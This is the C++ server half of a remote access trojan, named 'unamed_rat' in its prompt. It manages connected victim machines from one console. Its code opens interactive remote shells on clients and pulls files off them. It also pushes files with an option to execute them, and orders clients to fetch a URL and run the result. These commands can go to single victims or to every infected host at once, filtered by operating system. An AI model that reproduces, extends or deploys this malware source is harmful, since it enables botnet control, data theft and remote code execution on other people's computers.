#include "Server.hpp"
#include "Misc.hpp"
#include "Commands.hpp"

void Server::mtxLock(){
	mtxMutex.lock();
}

void Server::mtxUnlock(){
	mtxMutex.unlock();
}

void Server::FreeClient(int iClientID){
	if(Clients[iClientID] != nullptr){
		delete Clients[iClientID];
		Clients[iClientID] = nullptr;
		std::cout<<"memory released\n";
	}
}

void Server::FreeAllClients(){
	int iCounter = 0;
	for(; iCounter<Max_Clients; iCounter++){
		FreeClient(iCounter);
	}
}

bool Server::SendFile(const std::string strRemoteFile, const std::string strLocalFile, int iClientID, char cRun) {
	std::cout<<"Sending "<<strLocalFile<<'\n';
	std::ifstream strmInputFile(strLocalFile, std::ios::binary);
	if(!strmInputFile.is_open()){
		std::cout<<"Unable to open file\n";
		error();
		return false;
	}
	u64 uFileSize = Misc::GetFileSize(strLocalFile);
	u64 uBytesSent = 0;
	int iBytes = 0;
	int iBlockSize = 255;
	if(uFileSize == 0){
		strmInputFile.close();
		return false;
	}
	std::string strCmdLine = CommandCodes::cUpload;
	strCmdLine.append(std::to_string(uFileSize));
	strCmdLine.append(1, '@');
	strCmdLine.append(1, cRun);
	strCmdLine.append(1, '@');
	strCmdLine.append(strRemoteFile);
	strCmdLine.append(1, '@');
	strCmdLine.append(3, 'A'); //junk to the end
	std::cout<<"Comand "<<strCmdLine<<'\n';
	if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), 0) > 0){
		//sleep(1);
		char *tmpBuffer = nullptr;
		if(ssRecvBinary(Clients[iClientID]->sckSocket, tmpBuffer, 4) > 0){
			std::cout<<"Response "<<tmpBuffer<<'\n';
			if(strcmp(tmpBuffer, CommandCodes::cFileTranferBegin) != 0){
				std::cout<<"Not confirmed, cancel transfer...\n";
				strmInputFile.close();
				Misc::Free(tmpBuffer);
				return false;
			}
		} else {
			std::cout<<"Didnt receive confirmation from client\n";
			error();
			strmInputFile.close();
			Misc::Free(tmpBuffer);
		}
		Misc::Free(tmpBuffer);
		char *cFileBuffer = nullptr;
		int iTmp = 0;
		while(1){
			cFileBuffer = new char[iBlockSize];
			strmInputFile.read(cFileBuffer, iBlockSize);
			iTmp = strmInputFile.gcount();
			if(iTmp > 0){
				iBytes = send(Clients[iClientID]->sckSocket, cFileBuffer, iBlockSize, 0);
				if(iBytes > 0){
					uBytesSent += iBytes;
					Misc::ProgressBar(uBytesSent, uFileSize);
					std::fflush(stdout);
				} else {
					std::cout<<"Unable to send file bytes\n";
					error();
					break; //no bytes readed end?
				}
			} else {
				//Misc::Free(cFileBuffer);
				break;
			}
		}
		std::cout<<"\nTransfer done\n";
		Misc::Free(cFileBuffer);
	} else {
		std::cout<<"Unable to send command to client\n";
		error();
		strmInputFile.close();
		return false;
	}
	strmInputFile.close();
	return true;
}

bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
	std::cout<<"Downloading file "<<strRemoteFileName<<'\n';
	std::string cLocalName = "";
	char cRemoteFileNameCopy[261]; //MAX_PATH under windows is 260 chars
	strncpy(cRemoteFileNameCopy, strRemoteFileName.c_str(), 260); 
	char *tkToken = strtok(cRemoteFileNameCopy, Clients[iClientID]->strOS == "Windows" ? "\\" : "/");
	while(tkToken != nullptr){
		cLocalName = tkToken;
		tkToken = strtok(nullptr, Clients[iClientID]->strOS == "Windows" ? "\\" : "/");
	}
	std::time_t tTime = std::time(nullptr);
	cLocalName.append(1, ' ');
	cLocalName.append(Clients[iClientID]->strIP);
	cLocalName.append(1, ' ');
	cLocalName.append(std::asctime(std::localtime(&tTime)));
	cLocalName[cLocalName.length()-1] = '\0';
	std::cout<<"Local file : "<<cLocalName<<'\n';
	Misc::strReplaceSingleChar(cLocalName, ':', '-');
	std::string strCmdLine = CommandCodes::cDownload;
	strCmdLine.append(strRemoteFileName);
	if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), 0) > 0){
		char *cFileSizeBuffer = nullptr;
		u64 uTotalBytes = 0, uFinalSize = 0;
		int iBytesRead = 0, iBufferSize = 255;
		char *cFileBuffer = new char[iBufferSize];
		if(ssRecvBinary(Clients[iClientID]->sckSocket, cFileSizeBuffer, 20) > 0){
			if(strcmp(cFileSizeBuffer, CommandCodes::cFileTransferCancel) == 0){
				std::cout<<"Unable to download remote file\n";
				Misc::Free(cFileSizeBuffer);
				return false;
			}
			tkToken = cFileSizeBuffer;
			tkToken += 2;
			sscanf(tkToken, "%llui", &uFinalSize);
			Misc::Free(cFileSizeBuffer);
			std::cout<<"File size is "<<uFinalSize<<'\n';
			std::ofstream strmOutputFile(cLocalName, std::ios::binary);
			if(!strmOutputFile.is_open()){
				std::cout<<"Unable to open file "<<cLocalName<<'\n';
				error();
				return false;	
			} else {
				while(uTotalBytes<uFinalSize){
					iBytesRead = recv(Clients[iClientID]->sckSocket, cFileBuffer, iBufferSize, 0);
					if(iBytesRead > 0){
						strmOutputFile.write(cFileBuffer, iBytesRead);
						uTotalBytes += iBytesRead;
						Misc::ProgressBar(uTotalBytes, uFinalSize);
						std::fflush(stdout);
					} else {
						break;
					}				
				}
				strmOutputFile.close();
				std::cout<<"\nTransfer done!\n";
			}
		} else {
			Misc::Free(cFileBuffer);
			std::cout<<"Unable to receive remote filesize\n";
			error();
			return false;
		}
		Misc::Free(cFileBuffer);
	} else {
		std::cout<<"Unable to send command to client\n";
		error();
		return false;
	}
	return true;
}

void Server::ParseClientCommand(std::string strCommand, int iClientID){
	std::vector<std::string> vcClientCommands;
	Misc::strSplit(strCommand, ' ', vcClientCommands, 10);
	if(vcClientCommands[0][0] == '!'){
		std::string strTmp = vcClientCommands[0].substr(1, vcClientCommands[0].size() -1);
		for(u_int iIt2 = 1; iIt2<vcClientCommands.size(); iIt2++){
			strTmp.append(1, ' ');
			strTmp.append(vcClientCommands[iIt2]);
		}
		system(strTmp.c_str());
		return;
	}
	if(vcClientCommands.size() > 0){
		if(vcClientCommands[0] == "shell"){
			if(vcClientCommands.size() == 3){
				if(vcClientCommands[1] == "-c"){
					mtxLock();
					Clients[iClientID]->isFlag = true;
					mtxUnlock();
					std::string strCommandLine = CommandCodes::cShell;
					strCommandLine.append(vcClientCommands[2]);
					if(ssSendBinary(Clients[iClientID]->sckSocket, strCommandLine.c_str(), 0) > 0){
						//receive confirmation that program is spawned
						char *cConfirm = nullptr;
						if(ssRecvBinary(Clients[iClientID]->sckSocket, cConfirm, 4) > 0){
								//if(strcmp(cConfirm, "1@1") == 0){							--  uncomment this to test with client
									//spawn thread to receive output from shell             --     ""      ""  ""  ""   ""   ""
									isReadingShell = true;
									std::thread thCmd(&Server::threadRemoteCmdOutput, this, iClientID);
									while(isReadingShell){
										std::string strShellInput = "";
										std::getline(std::cin, strShellInput);
										if(Clients[iClientID] == nullptr){
											break;
										}
										if(strShellInput.length() == 0){
											continue;
										}
										ssSendBinary(Clients[iClientID]->sckSocket, strShellInput.c_str(), 0);
									}
									thCmd.join();
								//} else {													--  uncomment this to test with client
								//	std::cout<<"Shell not spawned\n";						--    ""       ""  ""  ""   ""   ""
								//}															--    ""       ""  ""  ""   ""   ""
						} else {
							std::cout<<"Unable to read response from client\n";
						}
					} else {
						std::cout<<"Unable to send command to client\n";
						error();
					}
					mtxLock();
					Clients[iClientID]->isFlag = false;
					mtxUnlock();
				}
			} else {
				std::cout<<"\n\tUse shell -c path_to_shell\n";
			}
			return;
		}
		if(vcClientCommands[0] == "info"){
			mtxLock();
			Clients[iClientID]->isFlag = true;
			mtxUnlock();	
			if(vcClientCommands.size() == 2){
				if(vcClientCommands[1] == "-b"){
					//basic information
					char *cBufferInfo = nullptr;
					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqBasicInfo, 0) > 0){
						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferInfo, 1024) > 0){
							ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 1 : 0);
						} else {
							std::cout<<"Unable to retrieve information from client\n";
							error();
						}
					} else {
						std::cout<<"Unable to send command to client\n";
						error();
					}
					delete[] cBufferInfo;
					cBufferInfo = nullptr;
				} else if(vcClientCommands[1] == "-f"){
					//full information
					char *cBufferFullInfo = nullptr;
					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqFullInfo, 0) > 0){
						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferFullInfo, 2048) > 0){
							//here parse full info depending wich os
							//Clients[iClientID]->strOS == "Linux" ? parsefullinfolinux : parsefullinfowindows
						} else {
							std::cout<<"Unable to retrieve information from client\n";
							error();
						}
					} else {
						std::cout<<"Unable to send command to client\n";
						error();
					}
					delete[] cBufferFullInfo;
					cBufferFullInfo = nullptr;
				}
			} else {
				std::cout<<"\n\tUse info -b (Basic)  -f (Full)\n";
			}
			mtxLock();
			Clients[iClientID]->isFlag = false;
			mtxUnlock();	
			return;
		}
		if(vcClientCommands[0] == "download"){
			if(vcClientCommands.size() == 3){
				if(vcClientCommands[1] == "-r"){
					mtxLock();
					Clients[iClientID]->isFlag = true;
					mtxUnlock();
					DownloadFile(vcClientCommands[2], iClientID); //check return boolean
					mtxLock();
					Clients[iClientID]->isFlag = false;
					mtxUnlock();
				}
			} else {
				std::cout<<"\n\tUse download -r remotefilename\n";
			}
			return;
		}
		if(vcClientCommands[0] == "upload"){
			if(vcClientCommands.size() == 5){
				mtxLock();
				Clients[iClientID]->isFlag = true;
				mtxUnlock();
				std::string strRemoteFile = "";
				std::string strLocalFile = "";
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){
					if(vcClientCommands[iIt2] == "-l"){
						strLocalFile = vcClientCommands[iIt2+1];
						continue;
					}
					if(vcClientCommands[iIt2] == "-r"){
						strRemoteFile = vcClientCommands[iIt2+1];
					}
				}
				if(strRemoteFile != "" && strLocalFile != ""){
					SendFile(strRemoteFile, strLocalFile, iClientID, '0'); //check return boolean
				} else {
					std::cout<<"Invalid filenames\n";
				}
				mtxLock();
				Clients[iClientID]->isFlag = false;
				mtxUnlock();
			} else {
				std::cout<<"\n\tUse upload -l local_filename -r remote_filename\n";
			}
			return;
		}
		if(vcClientCommands[0] == "httpd"){
			if(vcClientCommands.size() == 5){
				mtxLock();
				Clients[iClientID]->isFlag = true;
				mtxUnlock();
				std::string strCommandLine = CommandCodes::cHttpd;
				std::string strUrl = "";
				u_char cExec;
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){
					if(vcClientCommands[iIt2] == "-u"){
						strUrl = vcClientCommands[iIt2+1];
						continue;
					}
					if(vcClientCommands[iIt2] == "-r"){
						cExec = vcClientCommands[iIt2+1] == "yes" ? '1' : '0';
					}
				}
				strCommandLine.append(strUrl);
				strCommandLine.append(1, '@');
				strCommandLine.append(1, cExec);
				if(ssSendBinary(Clients[iClientID]->sckSocket, strCommandLine.c_str(), 0) > 0){
					std::cout<<"\n\tSent\n";
				} else {
					std::cout<<"Unable to send command to client\n";
					error();
				}
				mtxLock();
				Clients[iClientID]->isFlag = false;
				mtxUnlock();
			}
		}
	}
}

void Server::ParseMassiveCommand(std::string strCommand){
	std::vector<std::string> vcMassiveCommands;
	Misc::strSplit(strCommand, ' ', vcMassiveCommands, 10);
	if(vcMassiveCommands[0][0] == '!'){
		std::string strTmp = vcMassiveCommands[0].substr(1, vcMassiveCommands[0].size() -1);
		for(u_int iIt2 = 1; iIt2<vcMassiveCommands.size(); iIt2++){
			strTmp.append(1, ' ');
			strTmp.append(vcMassiveCommands[iIt2]);
		}
		system(strTmp.c_str());
		return;
	}
	//upload httpd 
	if(vcMassiveCommands.size() > 0){
		if(vcMassiveCommands[0] == "upload"){
			if(vcMassiveCommands.size() == 7){
				std::string strLocalFile = "";
				std::string strOS = "";
				u_char cExec = '0'; //default if by any reason loop f***k it
				for(u_int iIt=1; iIt<7; iIt+=2){
					if(vcMassiveCommands[iIt] == "-f"){
						strLocalFile = vcMassiveCommands[iIt+1];
						continue;
					}
					if(vcMassiveCommands[iIt] == "-r"){
						cExec = vcMassiveCommands[iIt+1] == "yes" ? '1' : '0';
						continue;
					}
					if(vcMassiveCommands[iIt] == "-o"){
						std::string strTmp = vcMassiveCommands[iIt+1];
						Misc::strToLower(strTmp);
						if(strTmp == "windows"){
							strOS = "Windows";
						} else if(strTmp == "linux"){
							strOS = "Linux";
						} else if(strTmp == "*") {
							strOS = "all";
						}
					}
				}
				if(strLocalFile.length() > 0 && strOS != ""){
					if(iClientsOnline > 0){
						std::cout<<"Sending command to "<<iClientsOnline<<" clients\n";
						std::string strRemoteFile = "";
						char cBufferTmp[261];
						strncpy(cBufferTmp, strLocalFile.c_str(), 260);
						char *tkToken = strtok(cBufferTmp, "/");
						while(tkToken != nullptr){
							strRemoteFile = tkToken;
							tkToken = strtok(nullptr, "/");
						}
						for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
							if(Clients[iIt2] != nullptr){
								if(Clients[iIt2]->strOS == strOS || strOS == "all"){
									mtxLock();
									Clients[iIt2]->isFlag = true;
									mtxUnlock();
									if(SendFile(strRemoteFile, strLocalFile, iIt2, cExec)){
										std::cout<<"Client ["<<iIt2<<"] success\n";
									} else {
										std::cout<<"Client ["<<iIt2<<"] fail\n";
										//error();
									}
									mtxLock();
									Clients[iIt2]->isFlag = false;
									mtxUnlock();
								}
							}
						}
					} else {
						std::cout<<"No clients online\n";
					}
				} else {
					std::cout<<"Error parsing arguments\n";
				}
			} else {
				std::cout<<"\n\tUse upload -f local_filename -r yes|no -o windows|linux|*\n";
			}
			return;
		}
		if(vcMassiveCommands[0] == "httpd"){
			if(vcMassiveCommands.size() == 7){
				std::string strOS = "";
				std::string strUrl = "";
				std::string strCommandLine = "";
				u_char cExec = '0';   //default if loop... you know
				for(u_int iIt2=1; iIt2<7; iIt2+=2){
					if(vcMassiveCommands[iIt2] == "-u"){
						strUrl = vcMassiveCommands[iIt2+1];
						continue;
					}
					if(vcMassiveCommands[iIt2] == "-r"){
						cExec = vcMassiveCommands[iIt2+1] == "yes" ? '1' : '0';
						continue;
					}
					if(vcMassiveCommands[iIt2] == "-o"){
						std::string strTmp = vcMassiveCommands[iIt2+1];
						Misc::strToLower(strTmp);
						if(strTmp == "windows"){
							strOS = "Windows";
						} else if(strTmp == "linux"){
							strOS = "Linux";
						} else if(strTmp == "*"){
							strOS = "all";
						}
					}
				}
				std::cout<<strUrl<<' '<<strOS<<'\n';
				if(strUrl.length() > 0 && strOS != ""){
					if(iClientsOnline > 0){
						std::cout<<"Sending command to "<<iClientsOnline<<" clients\n";
						std::string strCmdLine = CommandCodes::cHttpd;
						strCmdLine.append(1, cExec);
						strCmdLine.append(1, '@');
						strCmdLine.append(strUrl);
						for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
							if(Clients[iIt2] != nullptr){
								if(Clients[iIt2]->strOS == strOS || strOS == "all"){
									mtxLock();
									Clients[iIt2]->isFlag = true;
									mtxUnlock();
									if(ssSendBinary(Clients[iIt2]->sckSocket, strCmdLine.c_str(), 0) > 0){
										std::cout<<"Client ["<<iIt2<<"] success\n";
									} else {
										std::cout<<"Client ["<<iIt2<<"] fail\n";
									}
									mtxLock();
									Clients[iIt2]->isFlag = false;
									mtxUnlock();
								}
							}
						}
					} else {
						std::cout<<"No clients online\n";
					}
				} else {
					std::cout<<"Error parsing arguments\n";
				}
			} else {
				std::cout<<"\n\tUse httpd -u http://url/to/file -r yes|no -o windows|linux|*\n";
			}	
		} 
		return;
	}
}

void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
	if(cBuffer != nullptr){
		if(iOpt == 0){
			std::vector<std::string> vcWinInfo;
			std::vector<std::string> vcDrives;
			Misc::strSplit(cBuffer, '@', vcWinInfo, 4);
			if(vcWinInfo.size() == 4){
				std::cout<<"\n\tUsername: "<<vcWinInfo[0]<<"\n\tOS: "<<vcWinInfo[1]<<"\n\tHostname: "<<vcWinInfo[2]<<"\n\tAvailable Drives: ";
				Misc::strSplit(vcWinInfo[3], '#', vcDrives, 27);
				if(vcDrives.size() > 0){
					for(u_int iIt2=0; iIt2<vcDrives.size(); iIt2++){
						std::cout<<" ["<<vcDrives[iIt2]<<"] ";
					}
					std::cout<<'\n';
				} else {
					std::cout<<"No hardrives retrieved!!! aaaaiiiuuudaaaaaa\n";
				}
			} else {
				std::cout<<"No proccesable info heres raw\n"<<cBuffer<<'\n';
			}
		} else {
			//by now jus t print out recived buffer
			std::cout<<cBuffer<<'\n';
		}
	}	
}

int Server::ssSendStr(int sckSocket, const std::string& strMessage){
	std::string strTmp = txtCipher.strCipher(strMessage);
	int sBytes = strTmp.length();
	int iBytes = send(sckSocket, strTmp.c_str(), sBytes, 0);
	return iBytes;
}

int Server::ssRecvStr(int sckSocket, std::string& strOutput, int sBytes){
	char *tmpData = new char[sBytes+1];
	int iBytes = recv(sckSocket, tmpData, sBytes, 0);
	if(iBytes <= 0){
		return -1;
	}
	strOutput = txtCipher.strUnCipher(std::string(tmpData));
	delete[] tmpData;
	tmpData = nullptr;
	return iBytes;
}

int Server::ssSendBinary(int sckSocket, const char* cData, int iBytes){
	char *tmpData = nullptr;
	txtCipher.BinaryCipher(cData, tmpData);
	//Size not specified so calculate length of data to send
	if(iBytes == 0){
		iBytes = Misc::StrLen(tmpData);
	}
	int tBytes = send(sckSocket, tmpData, iBytes, 0);
	delete[] tmpData;
	tmpData = nullptr;
	return tBytes;
}
	
//delete memory of cOutput after use
int Server::ssRecvBinary(int sckSocket, char*& cOutput, int sBytes){
	char *cBuffer = new char[sBytes+1];
	if(cBuffer == nullptr){
		return -1;
	}
	int iBytes = recv(sckSocket, cBuffer, sBytes, 0);
	if(iBytes <=0){
		delete[] cBuffer;
		cBuffer = nullptr;
		return -1;
	}
	cBuffer[iBytes] = '\0';
	cOutput = txtCipher.BinaryUnCipher((const char *)cBuffer);
	//std::cout<<cOutput<<'\n';
	delete[] cBuffer;
	cBuffer = nullptr;
	return iBytes;
}

bool Server::Listen(u_int uiMaxq){
	int iStat = 0, iYes = 1;
	const char *cLocalPort = std::string(std::to_string(uiLocalPort)).c_str();
	struct addrinfo strctAd, *strctP, *strctServer;
	memset(&strctAd, 0, sizeof(strctAd));
	strctAd.ai_family = AF_UNSPEC;
	strctAd.ai_socktype = SOCK_STREAM;
	strctAd.ai_flags = AI_PASSIVE;
	if((iStat = getaddrinfo(nullptr, cLocalPort, &strctAd, &strctServer)) != 0){
		std::cout<<"Error getaddrinfo\n";
		error();
		return false;
	}
	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
		if((sckMainSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == -1){
			continue;
		}
		if(setsockopt(sckMainSocket, SOL_SOCKET, SO_REUSEADDR, &iYes, sizeof(int)) == -1){
			std::cout<<"setsockopt error\n";
			error();
			return false;
		}
		if(bind(sckMainSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
			continue;
		}
		//if reach here everything success
		fcntl(sckMainSocket, F_SETFL, O_NONBLOCK);
		break;
	}
	freeaddrinfo(strctServer);
	if(listen(sckMainSocket, uiMaxq) == -1){
		std::cout<<"Error listening\n";
		error();
		return false;
	}
	if(sckMainSocket == -1 || strctP == nullptr){
		return false;
	}
	return true;
}
		
int Server::WaitConnection(char*& output){
	char strIP[INET6_ADDRSTRLEN];
	int sckTmpSocket;
	struct sockaddr_storage strctClient;
	socklen_t slC = sizeof(strctClient);
	sckTmpSocket = accept(sckMainSocket, (struct sockaddr *)&strctClient, &slC);
	if(sckTmpSocket != -1){
		//beej guide network programming
		inet_ntop(strctClient.ss_family, get_int_addr((struct sockaddr *)&strctClient),strIP, sizeof(strIP));
	
		int sLen = Misc::StrLen(strIP);
		output = new char[sLen+1];
		strncpy(output, strIP, sLen);
	}
	return sckTmpSocket;
}

void Server::thStartHandler(){
	isReceiveThread = true;
	isCmdThread = true;
	std::thread t1(&Server::threadListener, this); //std::ref(*this));
	std::thread t2(&Server::threadMasterCMD, this); //, std::ref(*this));
	std::thread t3(&Server::threadClientPing, this); //, std::ref(*this));
	t1.join();
	t2.join();
	t3.join();
}

//handle incomming connections
void Server::threadListener(){
	//std::cout<<"Listener thread started\n";
	int iClientCount = 0, uiOldValue = 0;
	bool uiReachMax = false;
	while(isReceiveThread){  //receiver loop
		//if reach max connections loop until one disconects
		usleep(100000); //prevent 100% cpu usage 100 miliseconds
		if(iClientCount >= Max_Clients){
			uiReachMax = true;
			uiOldValue = iClientCount;
			bool isAvailable = false;
			int uiIt = 0;
			for(; uiIt<Max_Clients; uiIt++){
				if(Clients[uiIt] == nullptr){
					//found a spot
					iClientCount =  uiIt;
					isAvailable = true;
					break;
				}
			}
			if(!isAvailable){ continue; }
		}
		char *strTMPip = nullptr;
		int sckTMP = WaitConnection(strTMPip);
		if(sckTMP != -1){
			Clients[iClientCount] = new Client_Struct;
			if(Clients[iClientCount] == nullptr){
				std::cout<<"Error allocating memory for new client\n";
				error();
				continue;
			}
			Clients[iClientCount]->sckSocket = dup(sckTMP);
			
			//request os to client
			if(ssSendBinary(Clients[iClientCount]->sckSocket, CommandCodes::cReqOS, 0) > 0){
				char *strTmpBuffer = nullptr;
				int iBytes = ssRecvBinary(Clients[iClientCount]->sckSocket, strTmpBuffer, 20);
				if(iBytes > 0 && Misc::StrLen(strTmpBuffer) >  0){
					Clients[iClientCount]->strOS = strTmpBuffer[0] == '0' && strTmpBuffer[1] == '1' ? "Linux" : "Windows";
				} else {
					Clients[iClientCount]->strOS = "unkn0w";
				}
				delete[] strTmpBuffer;
				strTmpBuffer = nullptr;
			}
			
			//save obtained ip on client struct
			if(strTMPip != nullptr){
				Clients[iClientCount]->strIP = strTMPip;
				delete[] strTMPip;
				strTMPip = nullptr; 
			}
			
			mtxLock();
			Clients[iClientCount]->iID = iClientCount;
			Clients[iClientCount]->isConnected = true;
			Clients[iClientCount]->isFlag = false;
			iClientsOnline++;
			mtxUnlock();
			
			if(uiReachMax){
				iClientCount = uiOldValue;
			} else {
				iClientCount++;
			}
		} else {
			//check if memory was allocated for strTMPip
			if(strTMPip != nullptr){
				delete[] strTMPip;
				strTMPip = nullptr;
			}
		}
		
	}
}

//here parse all commands from stdin
void Server::threadMasterCMD(){
	std::string strPrompt = "unamed_rat# ";
	while(1){
		std::string strCMD;
		std::cout<<strPrompt;
		std::getline(std::cin, strCMD);
		if(strCMD.length() <= 1){
			continue;
		}
		std::vector<std::string> vcCommands;
		Misc::strSplit(strCMD, ' ', vcCommands, 10);
		//interact with clients
		if(vcCommands[0] == "cli"){
			if(vcCommands.size() == 5){ //cli -c id -a action
				int iClientId = 0;
				std::string strAction = "";
				for(u_int iIt2 = 1; iIt2<5; iIt2+=2){ //parse command line arguments
					if(vcCommands[iIt2] == "-c"){
						iClientId = Misc::StrToUint(vcCommands[iIt2+1].c_str());
						continue;
					}
					if(vcCommands[iIt2] == "-a"){
						strAction = vcCommands[iIt2+1];
					}
				}
				if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
					if(strAction == "interact"){
						//spawn prompt to interact with specified client
						std::string strClientCmd = "";
						std::string strPrompt = "[" + std::to_string(Clients[iClientId]->iID) + "]" + Clients[iClientId]->strIP + "@" + Clients[iClientId]->strOS + "#";
						do{
							std::cout<<strPrompt;
							strClientCmd = "";
							std::getline(std::cin, strClientCmd);
							if(Clients[iClientId] == nullptr){
								break;
							}
							if(strClientCmd.length() == 0){
								continue;
							}
							ParseClientCommand(strClientCmd, iClientId);
						}while(strClientCmd != "exit");
					}else if(strAction == "close"){ //close client conenction
 						if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
							if(ssSendBinary(Clients[iClientId]->sckSocket,CommandCodes::cClose, 0) > 0){
								close(Clients[iClientId]->sckSocket);
							} else {
								std::cout<<"Unable to send close command\n";
								error();
							}
						} else {
							std::cout<<"Client ["<<iClientId<<"] doesn't exist or is not connected anymore\n";
						}	
					}
				} else {
					std::cout<<"Client ["<<iClientId<<"] doesn't exist or is not connected anymore\n";
				}
				continue;
			}
			if(vcCommands.size() == 3){ //cli -c * massive command
				if(vcCommands[1] == "-c" && vcCommands[2] == "*"){
					std::string strMassiveCmd = "";
					do{
						std::cout<<"[ "<<iClientsOnline<<" ] online# ";
						std::getline(std::cin, strMassiveCmd);
						if(strMassiveCmd.length() == 0){
							continue;
						}
						ParseMassiveCommand(strMassiveCmd);
					}while(strMassiveCmd != "exit");
				}
				continue;
			}
			if(vcCommands.size() == 2){ //cli -l
				if(vcCommands[1] == "-l"){
					//list connected clients
					if(iClientsOnline <= 0){
						std::cout<<"\n\tNo clients online\n";
						continue;
					}
					std::cout<<"\tClients online\n";
					for(u_int iIt2 = 0; iIt2<Max_Clients; iIt2++){
						if(Clients[iIt2] != nullptr){
							if(Clients[iIt2]->isConnected){
								std::cout<<"\t["<<Clients[iIt2]->iID<<"] "<<Clients[iIt2]->strIP<<" "<<Clients[iIt2]->strOS<<"\n";
							}
						}
					}
				}
			}
		}
		//help documentation goes here
		if(vcCommands[0] == "?"){
			std::cout<<"this is help, yes what else you was waiting for\n";
			continue;
		}
		//run shell command
		if(vcCommands[0][0] == '!'){
			std::string strShellCommand = vcCommands[0].substr(1, vcCommands[0].length()-1);
			for(u_int iIt2 = 1; iIt2<vcCommands.size(); iIt2++){
				strShellCommand.append(1, ' ');
				strShellCommand.append(vcCommands[iIt2]);
			}
			system(strShellCommand.c_str());
			continue;
		}
		//exit program
		if(vcCommands[0] == "exit"){
			std::cout<<"bye\n";
			break;
		}
	}
	mtxLock();
	isReceiveThread = false;
	isCmdThread = false;
	FreeAllClients();
	mtxUnlock();
}

void Server::threadClientPing(){
	//std::cout<<"Statrted ping\n";
	
	while(isCmdThread){
		for(int iClientID = 0; iClientID<Max_Clients; iClientID++){
			if(Clients[iClientID] != nullptr && Clients[iClientID]->isConnected){
				if(Clients[iClientID]->isFlag){
					sleep(2);
					continue;
				} else {
					int iBytes = send(Clients[iClientID]->sckSocket, "", 1, 0);
					if(iBytes != 1){
						std::cout<<"Client["<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<" disconnected\n";
						mtxLock();
						Clients[iClientID]->isConnected = false;
						iClientsOnline--;
						FreeClient(iClientID);
						mtxUnlock();
					}
				}
			}
			usleep(100000); //prevent 100% cpu usage  100 miliseconds
		}
		sleep(3);
	}
}

void Server::threadRemoteCmdOutput(int iClientID){
	if(Clients[iClientID] != nullptr){
		char *cCmdBuffer = nullptr;
		int iBytes = 0;
		while(isReadingShell){
			iBytes = ssRecvBinary(Clients[iClientID]->sckSocket, cCmdBuffer, 1024);
			if(iBytes > 0){
				if(Misc::StrLen(cCmdBuffer) == 2 && cCmdBuffer[0] == '#' && cCmdBuffer[1] == 'p'){
					//end reading remote output
					break;
				}
				std::cout<<cCmdBuffer;
				delete[] cCmdBuffer;
			}
		}
		if(cCmdBuffer != nullptr){
			delete[] cCmdBuffer;
			cCmdBuffer = nullptr;
		}
	} else {
		std::cout<<"thread not spawned client doesnt exist or is not connected\n";
	}
}

//beej guide network programming
void *get_int_addr(struct sockaddr *sa){
	if(sa->sa_family == AF_INET){
		return &(((struct sockaddr_in*)sa)->sin_addr);
	}
	return &(((struct sockaddr_in6*)sa)->sin6_addr);
}
